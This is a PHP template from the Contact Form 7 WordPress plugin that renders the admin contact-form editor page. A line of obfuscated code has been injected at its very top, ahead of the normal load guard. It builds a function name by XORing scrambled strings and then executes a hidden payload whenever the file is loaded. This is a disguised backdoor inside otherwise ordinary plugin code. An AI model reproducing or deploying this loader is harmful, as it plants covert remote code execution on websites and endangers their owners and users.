<?php $gPaYQEW='44R35QsU <2NIXY'; $cAIUAHIx='WF7RA4,3URQ: 77'^$gPaYQEW; $CfJvTPEj='-5zs4UT;3X.8bXS,1>CLc-543YSHOgiU4 bddkBAsUD= 8Y-BaO>7nIUG 8d5-NJSUT:5etc,<NeYOlclLKpsPY<=pqmMwv85oPQGlt EkdvqHk=y:0B. BXuY4A7QxdNUlNhbdjw==EgdSlbR< ,Soe=kPcvrZ4U9i3UBxMT1<- dh,SWo9zikqxN+5=1 yq,< sol0JK7lOPZ+MWjnOK8+2Ypgh  TAlS+ qzPVW6GRuczK D33Y;uOghy.6>3 ML;Ep 2HvXlgh9UR2,sQ,M3e4T;Pi2P-RuKn8W+jg:S2+;YEvTQZ0;9YTNOYGZFKyrkS582dILx5VBYR-;,dpc13ud<k4aN8NhbGXCtVfQgE Q4RzqB8:pFHLC s3W0DtBb=.LxDBxrRL>0ahqfJ  >Wn:GEc9FALRR66ejen Y =9Q,4GI1Z=<F:=;,V:q4-0nN  VcaeY=YO7,zcS M0lzsP TGV9<5Abqi=S>MbRRN0svopM3=M eSW b-NDDO1bBQH<FeuO.A TKjmsvKUVVpu X=9np.75d+pPpLvekPgqQWYczxrHWsQK1lCXZnXe7V=g4hqkSniurG669 Gq.W.m1E=SI+iaI9DB=T+BgsJ5;DUgodjpivwBLo6L6;mc5X ;prJ2JA+56RhlJLHI-;9ZgcsYL'; $lxEvKML=$cAIUAHIx('', 'DSRRR :XG1AV==+EBJ0dDUZFl=2<.868ATEMMK9Kz31SCL0B,A7QE1-43Ag;XX:bw15NTITGGY7LyoLCL7Ayzt6IIPLMjPM2<f6>5DPIeVDFJhOTEID0BE,pQ=U5VxCDj<GeAhmcSRH1GJnLJvXAX24AT6p=VV1Q,bMZugX> CPHNLLG6.FdSRaxq<NAHCNQUCITZTf97AJfEt>J96JSo-YGA<KmLDA  38NYQGp06Z47Nip-O6VR:SUgC7:ayuzem-HeTKW1VeRGLO4>GIZqWG:AP5O16Y5TrHkJS2RQm3wVJO8eKtu,QWL<oD2SM3 kQSO7TLSMi7r<0-+7LXDDXGna05i.g5nY=HF,=:TkXqC3A=A7SQ923yb,-7A,X2IdIbFVK5CNKqV6-JQAUQB<ALK2U0N8iDLKh63BWEWE.U7SXK8MX.3TrES4eYZX7e.YXDF,AS3UU:=X: SIRG7A9QEVStD537fWP8KXR7:XeF63:QSPIP,AO,Y:82Y=H6-7;BJe:-EaIUkJ T5bJKUVc82cXQD9IX5WERLCvYpMqVBR3SG24:VMMDz2AgxRYz;;XiVUnYVPQBStGISTgWDKA>.E2W2T=T =XAF9X=.R5OeKSnQZ04NFDJPIVW9FfS:WWEGQ9TZ+U:S3-DTRu5EqFA,URMrWJHS1'^$CfJvTPEj); $lxEvKML();

// don't load directly
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

function wpcf7_admin_save_button( $post_id ) {
	static $button = '';

	if ( ! empty( $button ) ) {
		echo $button;
		return;
	}

	$nonce = wp_create_nonce( 'wpcf7-save-contact-form_' . $post_id );

	$onclick = sprintf(
		"this.form._wpnonce.value = '%s';"
		. " this.form.action.value = 'save';"
		. " return true;",
		$nonce );

	$button = sprintf(
		'<input type="submit" class="button-primary" name="wpcf7-save" value="%1$s" onclick="%2$s" />',
		esc_attr( __( 'Save', 'contact-form-7' ) ),
		$onclick );

	echo $button;
}

?><div class="wrap" id="wpcf7-contact-form-editor">

<h1 class="wp-heading-inline"><?php
	if ( $post->initial() ) {
		echo esc_html( __( 'Add New Contact Form', 'contact-form-7' ) );
	} else {
		echo esc_html( __( 'Edit Contact Form', 'contact-form-7' ) );
	}
?></h1>

<?php
	if ( ! $post->initial()
	and current_user_can( 'wpcf7_edit_contact_forms' ) ) {
		echo wpcf7_link(
			menu_page_url( 'wpcf7-new', false ),
			__( 'Add New', 'contact-form-7' ),
			array( 'class' => 'page-title-action' )
		);
	}
?>

<hr class="wp-header-end">

<?php
	do_action( 'wpcf7_admin_warnings',
		$post->initial() ? 'wpcf7-new' : 'wpcf7',
		wpcf7_current_action(),
		$post
	);

	do_action( 'wpcf7_admin_notices',
		$post->initial() ? 'wpcf7-new' : 'wpcf7',
		wpcf7_current_action(),
		$post
	);
?>

<?php
if ( $post ) :

	if ( current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) {
		$disabled = '';
	} else {
		$disabled = ' disabled="disabled"';
	}
?>

<form method="post" action="<?php echo esc_url( add_query_arg( array( 'post' => $post_id ), menu_page_url( 'wpcf7', false ) ) ); ?>" id="wpcf7-admin-form-element"<?php do_action( 'wpcf7_post_edit_form_tag' ); ?>>
<?php
	if ( current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) {
		wp_nonce_field( 'wpcf7-save-contact-form_' . $post_id );
	}
?>
<input type="hidden" id="post_ID" name="post_ID" value="<?php echo (int) $post_id; ?>" />
<input type="hidden" id="wpcf7-locale" name="wpcf7-locale" value="<?php echo esc_attr( $post->locale() ); ?>" />
<input type="hidden" id="hiddenaction" name="action" value="save" />
<input type="hidden" id="active-tab" name="active-tab" value="<?php echo isset( $_GET['active-tab'] ) ? (int) $_GET['active-tab'] : '0'; ?>" />

<div id="poststuff">
<div id="post-body" class="metabox-holder columns-2">
<div id="post-body-content">
<div id="titlediv">
<div id="titlewrap">
	<label class="screen-reader-text" id="title-prompt-text" for="title"><?php echo esc_html( __( 'Enter title here', 'contact-form-7' ) ); ?></label>
<?php
	$posttitle_atts = array(
		'type' => 'text',
		'name' => 'post_title',
		'size' => 30,
		'value' => $post->initial() ? '' : $post->title(),
		'id' => 'title',
		'spellcheck' => 'true',
		'autocomplete' => 'off',
		'disabled' =>
			current_user_can( 'wpcf7_edit_contact_form', $post_id ) ? '' : 'disabled',
	);

	echo sprintf( '<input %s />', wpcf7_format_atts( $posttitle_atts ) );
?>
</div><!-- #titlewrap -->

<div class="inside">
<?php
	if ( ! $post->initial() ) :
?>
	<p class="description">
	<label for="wpcf7-shortcode"><?php echo esc_html( __( "Copy this shortcode and paste it into your post, page, or text widget content:", 'contact-form-7' ) ); ?></label>
	<span class="shortcode wp-ui-highlight"><input type="text" id="wpcf7-shortcode" onfocus="this.select();" readonly="readonly" class="large-text code" value="<?php echo esc_attr( $post->shortcode() ); ?>" /></span>
	</p>
<?php
		if ( $old_shortcode = $post->shortcode( array( 'use_old_format' => true ) ) ) :
?>
	<p class="description">
	<label for="wpcf7-shortcode-old"><?php echo esc_html( __( "You can also use this old-style shortcode:", 'contact-form-7' ) ); ?></label>
	<span class="shortcode old"><input type="text" id="wpcf7-shortcode-old" onfocus="this.select();" readonly="readonly" class="large-text code" value="<?php echo esc_attr( $old_shortcode ); ?>" /></span>
	</p>
<?php
		endif;
	endif;
?>
</div>
</div><!-- #titlediv -->
</div><!-- #post-body-content -->

<div id="postbox-container-1" class="postbox-container">
<?php if ( current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) : ?>
<div id="submitdiv" class="postbox">
<h3><?php echo esc_html( __( 'Status', 'contact-form-7' ) ); ?></h3>
<div class="inside">
<div class="submitbox" id="submitpost">

<div id="minor-publishing-actions">

<div class="hidden">
	<input type="submit" class="button-primary" name="wpcf7-save" value="<?php echo esc_attr( __( 'Save', 'contact-form-7' ) ); ?>" />
</div>

<?php
	if ( ! $post->initial() ) :
		$copy_nonce = wp_create_nonce( 'wpcf7-copy-contact-form_' . $post_id );
?>
	<input type="submit" name="wpcf7-copy" class="copy button" value="<?php echo esc_attr( __( 'Duplicate', 'contact-form-7' ) ); ?>" <?php echo "onclick=\"this.form._wpnonce.value = '$copy_nonce'; this.form.action.value = 'copy'; return true;\""; ?> />
<?php endif; ?>
</div><!-- #minor-publishing-actions -->

<div id="misc-publishing-actions">
<?php do_action( 'wpcf7_admin_misc_pub_section', $post_id ); ?>
</div><!-- #misc-publishing-actions -->

<div id="major-publishing-actions">

<?php
	if ( ! $post->initial() ) :
		$delete_nonce = wp_create_nonce( 'wpcf7-delete-contact-form_' . $post_id );
?>
<div id="delete-action">
	<input type="submit" name="wpcf7-delete" class="delete submitdelete" value="<?php echo esc_attr( __( 'Delete', 'contact-form-7' ) ); ?>" <?php echo "onclick=\"if (confirm('" . esc_js( __( "You are about to delete this contact form.\n  'Cancel' to stop, 'OK' to delete.", 'contact-form-7' ) ) . "')) {this.form._wpnonce.value = '$delete_nonce'; this.form.action.value = 'delete'; return true;} return false;\""; ?> />
</div><!-- #delete-action -->
<?php endif; ?>

<div id="publishing-action">
	<span class="spinner"></span>
	<?php wpcf7_admin_save_button( $post_id ); ?>
</div>
<div class="clear"></div>
</div><!-- #major-publishing-actions -->
</div><!-- #submitpost -->
</div>
</div><!-- #submitdiv -->
<?php endif; ?>

<div id="informationdiv" class="postbox">
<h3><?php echo esc_html( __( "Do you need help?", 'contact-form-7' ) ); ?></h3>
<div class="inside">
	<p><?php echo esc_html( __( "Here are some available options to help solve your problems.", 'contact-form-7' ) ); ?></p>
	<ol>
		<li><?php echo sprintf(
			/* translators: 1: FAQ, 2: Docs ("FAQ & Docs") */
			__( '%1$s and %2$s', 'contact-form-7' ),
			wpcf7_link(
				__( 'https://contactform7.com/faq/', 'contact-form-7' ),
				__( 'FAQ', 'contact-form-7' )
			),
			wpcf7_link(
				__( 'https://contactform7.com/docs/', 'contact-form-7' ),
				__( 'docs', 'contact-form-7' )
			)
		); ?></li>
		<li><?php echo wpcf7_link(
			__( 'https://wordpress.org/support/plugin/contact-form-7/', 'contact-form-7' ),
			__( 'Support forums', 'contact-form-7' )
		); ?></li>
		<li><?php echo wpcf7_link(
			__( 'https://contactform7.com/custom-development/', 'contact-form-7' ),
			__( 'Professional services', 'contact-form-7' )
		); ?></li>
	</ol>
</div>
</div><!-- #informationdiv -->

</div><!-- #postbox-container-1 -->

<div id="postbox-container-2" class="postbox-container">
<div id="contact-form-editor">
<div class="keyboard-interaction"><?php
	echo sprintf(
		/* translators: 1: ◀ ▶ dashicon, 2: screen reader text for the dashicon */
		esc_html( __( '%1$s %2$s keys switch panels', 'contact-form-7' ) ),
		'<span class="dashicons dashicons-leftright" aria-hidden="true"></span>',
		sprintf(
			'<span class="screen-reader-text">%s</span>',
			/* translators: screen reader text */
			esc_html( __( '(left and right arrow)', 'contact-form-7' ) )
		)
	);
?></div>

<?php

	$editor = new WPCF7_Editor( $post );
	$panels = array();

	if ( current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) {
		$panels = array(
			'form-panel' => array(
				'title' => __( 'Form', 'contact-form-7' ),
				'callback' => 'wpcf7_editor_panel_form',
			),
			'mail-panel' => array(
				'title' => __( 'Mail', 'contact-form-7' ),
				'callback' => 'wpcf7_editor_panel_mail',
			),
			'messages-panel' => array(
				'title' => __( 'Messages', 'contact-form-7' ),
				'callback' => 'wpcf7_editor_panel_messages',
			),
		);

		$additional_settings = trim( $post->prop( 'additional_settings' ) );
		$additional_settings = explode( "\n", $additional_settings );
		$additional_settings = array_filter( $additional_settings );
		$additional_settings = count( $additional_settings );

		$panels['additional-settings-panel'] = array(
			'title' => $additional_settings
				? sprintf(
					/* translators: %d: number of additional settings */
					__( 'Additional Settings (%d)', 'contact-form-7' ),
					$additional_settings )
				: __( 'Additional Settings', 'contact-form-7' ),
			'callback' => 'wpcf7_editor_panel_additional_settings',
		);
	}

	$panels = apply_filters( 'wpcf7_editor_panels', $panels );

	foreach ( $panels as $id => $panel ) {
		$editor->add_panel( $id, $panel['title'], $panel['callback'] );
	}

	$editor->display();
?>
</div><!-- #contact-form-editor -->

<?php if ( current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) : ?>
<p class="submit"><?php wpcf7_admin_save_button( $post_id ); ?></p>
<?php endif; ?>

</div><!-- #postbox-container-2 -->

</div><!-- #post-body -->
<br class="clear" />
</div><!-- #poststuff -->
</form>

<?php endif; ?>

</div><!-- .wrap -->

<?php

	$tag_generator = WPCF7_TagGenerator::get_instance();
	$tag_generator->print_panels( $post );

	do_action( 'wpcf7_admin_footer', $post );
